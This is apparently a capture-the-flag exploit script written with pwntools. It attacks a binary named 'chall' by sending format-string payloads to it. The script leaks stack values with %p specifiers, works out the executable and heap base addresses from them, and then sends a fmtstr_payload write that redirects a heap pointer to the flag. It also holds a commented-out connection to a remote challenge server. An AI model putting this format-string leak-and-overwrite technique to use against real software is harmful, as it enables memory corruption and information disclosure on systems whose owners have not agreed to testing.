from pwn import *

exe = context.binary = ELF("./chall")
context.log_level = 'debug'
r = process()
# r = remote("194.31.53.241", 13338)
offset = 74
rop = ROP(exe)
def sending_fmtr(payload,offset):
    r.sendline("1")
    r.sendline(payload)
    r.sendline("2")
    leak = r.recv(9999)
    r.sendline("")
    return leak
sending_fmtr("%17$p",17)
leak = sending_fmtr(f"%15$p",15)
# sending_fmtr(fmtstr_payload(77))
print(f"Leaking tewaking: {leak}")
decoded = leak.decode()
matches = re.findall(r"Posts\s*:\s*1\. (0x[0-9a-fA-F]+)\s*2\. (0x[0-9a-fA-F]+)", decoded)

heap_base = 0
print("==========================")
if matches:
    exe_leak, heap_leak = matches[0]
    exe_leak = int(exe_leak, 16)
    heap_leak = int(heap_leak, 16)

    # Fix base addresses
    exe_base = exe_leak - 0x133d  # or adjust based on symbol offset
    heap_base = heap_leak - 0x330

    print(f"exe_leak: {hex(exe_leak)}")
    print(f"heap_leak: {hex(heap_leak)}")
    print(f"Fixed exe base: {hex(exe_base)}")
    exe.address = exe_base
    print(f"Fixed heap base: {hex(heap_base)}")
else:
    print("Failed to parse leaks.")
flag = exe.address + 0x2023
heap_overwrite = heap_base + 0x330
payload = fmtstr_payload(offset,{heap_overwrite: flag})
# sending_fmtr(payload, offset)
r.sendline("1")
sleep(3)
r.sendline(payload)
r.sendline("2")
print(f"Leaking tweaking like insane: {r.recv(9999)}")
r.sendline("")
r.sendline("2")
print(hex(flag))
r.interactive()